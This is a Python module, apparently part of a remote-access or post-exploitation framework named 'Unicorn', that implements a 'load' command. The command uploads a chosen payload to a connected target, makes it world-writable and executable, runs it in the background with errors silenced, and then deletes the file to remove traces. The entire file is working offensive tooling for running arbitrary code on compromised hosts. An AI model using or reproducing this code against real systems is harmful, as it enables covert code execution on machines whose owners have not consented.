#!/usr/bin/env python3

from core.badges import badges

class UnicornModule:
    def __init__(self, unicorn):
        self.unicorn = unicorn
        self.badges = badges()

        self.name = "load"
        self.description = "Load custom payload."
        self.usage = "Usage: load <input_file> [argv]"
        self.type = "managing"
        self.args = 2

    def run(self, cmd_data):
        input_file = cmd_data.split(" ")[0]

        files = input_file + " " + input_file

        arguments = "".join(cmd_data.split(input_file)).strip()

        print(self.badges.G + "Sending payload...")

        self.unicorn.upload(files)
        instructions = \
        "chmod 777 ./" + input_file + ";" + \
        "./" + input_file + " " + arguments + " 2>/dev/null &;" + \
        "rm ./" + input_file + "\n"
        print(self.badges.G + "Executing payload...")

        print(self.unicorn.send_command(self.name, instructions))
        print(self.badges.S + "Payload executed!")